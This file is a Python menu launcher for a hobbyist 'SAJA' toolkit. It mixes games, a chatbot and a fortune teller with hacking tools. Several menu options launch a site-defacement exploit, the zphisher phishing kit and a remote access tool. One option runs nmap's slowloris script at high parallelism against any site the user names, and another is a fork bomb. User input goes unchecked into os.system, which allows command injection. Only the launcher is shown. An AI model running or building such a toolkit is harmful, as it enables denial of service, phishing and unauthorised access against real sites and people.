import os
from colorama import Fore, Back, Style
banner = """
            ==========SAJA==========
                                                                                                                
                                                                                                    
                                                                                                    
                                                                                  ``  V3 beta version  
                                                                                .-`                 
                                                                              ./-                   
                                                                            ./:`                    
                                                                          -o/.                      
                                                                        .oo.                        
                                                                      .+s:                          
                                                  `                 `+y+`                           
                                                 .ss/.             :ys.                             
                                       .          o-+syo:-`      .sy:`                              
                                     `+:          :o `.:osyys+:-+ho`                                
                                    -y/            os`   ``-:oddhdhyo+/:-.``                        
                                   /y-              os`     .sh/`..-:+osyyyyys+/:-..`               
                                 `oh/`              `os`  `+ds.          `..-:+osyyyyss+-           
                                .y+.-/+///:-.`       `oy..yd/`                    ``.....           
                               -y:     `..-/+oo/.      +hdh-                                        
                              :o.             ./ss:`   -md/                                         
                              :                  -sy-  -/:h-                                        
                                                   :yo`   -h.                                       
                                                    `sy`   :s                                       
               `..-`          `:`                    `yy    /:                                      
          ``   `.:syo+/.`    .s+                      .m:    .                     `.               
         /s+-     `h:-/sss/.:h+                       -m-                          `.               
        +h.        /h`  `-+ddh:`                    `:h+                                            
       -d:          ys   -hs-:syo:`         .:::::/oys-                                             
      `hs           -m+`oh/    `:oys+-`       `.:::-`                    
      /m.            +mhs.         ./oso-`                                          
      hs       `-/:  -md`              .:/:                                               
     .m/   `./shoym. :+mo                                                            
     `ds+oyys/-  hh    +m-                                                             
      .::-`     om:     oy                                                                          
               /m+       +-                                                                         
              :do                          `-/++o++//:-`                                            
             :ds                       `-:::.``  ``.-:/osss+:.    Version3                                      
            /mo                       ``                  `./oyy+-                                  
           :d/                    .://:`                       `:ohs:                               
           ``                  .-:-`                               -oho.                            
                             ``                            .////+.   `+do`                          
                            `                            .+:    `y     `sh.                         
                           `                 .         `+:      `y       +d.                        
                          `                  .- ``    .+`       //        od.                       
                         `     .--:---..`     .. /.  `o`       :o          yy                       
                        `. -+sy+/:::://++o+.   -``s` o`      `o/           -m-                      
                        :  -.`oo.         .o+   - -+`+      :+.             hs                      
                        +      :ss-         o+  `. :+/   `:+-               oh                      
                        o        -+s+-      -h   -  .+/-/+-`                +d                      
                        o          `-+so+//os-   -`.-/o+/-            `-    oh                      
                        o             ``.--.`    -````  `.:-         .s.    sy                      
                        ::                       :`        `.      -oo.     h+                      
                         o.                      :.         `      :s      :d.                      
                         `o`                     ./         `       h`    `h+                       
                          `+`                     o`       `   `.-:/o    `so                        
                           `/-                    .+`     ``  -:...`    .s+`                        
                             -/-                   `:-.`..    +.      `+y:                          
                              `-/:.        ./.   -//:.``.-::-.o:    ./s/`                           
                                 .:/:.`     `o. +: `-o-./` `-:+` `-+o:`                             
                                    .-:/:-.` `s/+    `os`    `.:++/.                                
                                        .-:///oh/--------::/+//-`                                   
                                              `.----:::--..`                



                        
      \\\\\\\\\\\\            +++++++++++
      /\\\\\\\\\\\\         /////////            +
          \\\\\\\\\\\       /////////  ++++++ 
     .m/  \\\\\\\\\\\   //////////             +                                            
               \\\\\\\\\\\//////////--------+
"""

print(banner)
print(Fore.GREEN + 'Hello This is SAJA')
print("Libratum Ordo Seclorum")
print("Disclaimer:use this only as ethical purposes and I am not responsible for your act with the hacking tools.")
print('Notice that SaJa AI is an open source program and is made by the author Jihwan Ahn.')
print("options=================================================================================================")
print("{1}deface                                 {2}ipfy                                       {3}Emotion AI")
print("{4}zphisher                               {5}Ddos attacker                              {6}Chatbot AI")
print("{7}guess  game                            {8}Equation solver                            {9}Song lyrics")
print("{10}Saju Fortune Teller                   {11}A-Rat                                     {12}wget")
print("{13}Fork bomb")


command = input("saja@  ")


a = "1"
b = "2"
c = "3"
e = "4"
f = "5"
cbot = "6"
game = "7"
es = "8"
nor = "9"
saju = "10"
arat = "11"
wget = "12"
fork = "13"
nora = "14"

#workin'
if command == cbot :
    exec(open("chatbot.py").read())
    
#workin'
if command == es :
    exec(open("prime.py").read())
    
#workin'
if command == a :
    exec(open("exploit.py").read())

#workin'
if command == b :
    ip = input("while using Ipfy, what ip will you track?")
    os.system("python ipfy.py -t " + ip) 
    
if command == wget :
    url = input("your url to wget~@")
    os.system("wget  " + url) 

#workin'
if command == c :
    exec(open("sa.py").read())

#workin'
if command == game :
    exec(open("game.py").read())
    
    #workin'
if command == nor :
    exec(open("lyrics.py").read())
    
#workin'
if command == saju :
    exec(open("saju.py").read())
    
#workin'
if command == arat :
    os.system("python2 Arat.py")
    
#workin'
if command == e :
    os.system("bash zphisher.sh")

#workin'
if command == f :
    wantsite = input("What site to dos?")
    os.system("nmap --script http-slowloris --max-parallelism 400 " + wantsite)

#workin'
if command == fork :
    exec(open("srp.py").read())
    
#workin'
if command == nora :
    exec(open("norazotic.py").read())
